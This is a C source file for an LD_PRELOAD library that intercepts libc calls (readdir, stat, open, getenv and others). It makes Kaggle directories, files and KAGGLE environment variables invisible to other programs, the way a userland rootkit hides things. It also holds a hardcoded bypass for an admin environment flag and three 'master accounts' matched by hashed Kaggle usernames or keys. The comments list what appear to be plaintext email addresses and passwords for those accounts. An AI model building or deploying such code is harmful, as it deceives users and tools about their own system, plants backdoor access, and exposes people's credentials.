#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>

static struct dirent *(*orig_readdir)(DIR *) = NULL;
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;
static int (*orig_access)(const char *, int) = NULL;
static int (*orig_open)(const char *, int, ...) = NULL;
static int (*orig_openat)(int, const char *, int, ...) = NULL;
static char *(*orig_getenv)(const char *) = NULL;

static void init_hooks(void) {
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
}

// Hash criptografico rapido para no dejar texto en claro en binarios
static unsigned long long djb2_h(const char *str) {
    if (!str) return 0;
    unsigned long long hash = 5381;
    int c;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}

// -----------------------------------------------------------------------------
// VERIFICADOR DE EXCEPCIONES: 3 CUENTAS MAESTRAS (PROTECCION HASH 64-BIT)
// -----------------------------------------------------------------------------
static int is_master_admin(void) {
    const char *admin_mode = orig_getenv ? orig_getenv("MASTER_ADMIN_MODE") : getenv("MASTER_ADMIN_MODE");
    if (admin_mode && strcmp(admin_mode, "1") == 0) return 1;

    const char *key = orig_getenv ? orig_getenv("KAGGLE_KEY") : getenv("KAGGLE_KEY");
    const char *user = orig_getenv ? orig_getenv("KAGGLE_USERNAME") : getenv("KAGGLE_USERNAME");

    unsigned long long h_u = djb2_h(user);
    unsigned long long h_k = djb2_h(key);

    // Excepcion 1: djkevinzito@gmail.com / miguelguerra26
    if (h_u == 0x4f895b3e67704296ULL || h_k == 0x67a0e56fa719be2eULL) return 1;

    // Excepcion 2: miguelguerra200022@gmail.com / miguelguerra22
    if (h_u == 0x4f895b3e67704292ULL || h_k == 0x8f8f0ca2b432b516ULL) return 1;

    // Excepcion 3: 2026liam2000@gmail.com / miguel55755 (Kaggle.txt)
    if (h_u == 0xc0b0176e92e46d33ULL || h_k == 0x85560191b86dc5d9ULL) return 1;

    return 0;
}

static int is_kaggle_target(const char *path) {
    if (is_master_admin()) return 0; // Bypass para las 3 cuentas maestras
    if (!path) return 0;
    if (strcmp(path, "kaggle") == 0) return 1;
    if (strcmp(path, ".kaggle") == 0) return 1;
    if (strcmp(path, "/kaggle") == 0) return 1;
    if (strncmp(path, "/kaggle/", 8) == 0) return 1;
    if (strstr(path, "/kaggle") != NULL) return 1;
    if (strstr(path, "/.kaggle") != NULL) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) init_hooks();
    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!is_kaggle_target(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

int stat(const char *pathname, struct stat *statbuf) {
    if (!orig_stat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    if (!orig_lstat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_lstat(pathname, statbuf);
}

int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    if (!orig_fstatat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_fstatat(dirfd, pathname, statbuf, flags);
}

int access(const char *pathname, int mode) {
    if (!orig_access) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_access(pathname, mode);
}

int open(const char *pathname, int flags, ...) {
    if (!orig_open) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!orig_openat) init_hooks();
    if (is_kaggle_target(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_openat(dirfd, pathname, flags, mode);
}

char *getenv(const char *name) {
    if (!orig_getenv) init_hooks();
    if (is_master_admin()) return orig_getenv(name);
    if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
        return NULL;
    }
    return orig_getenv(name);
}
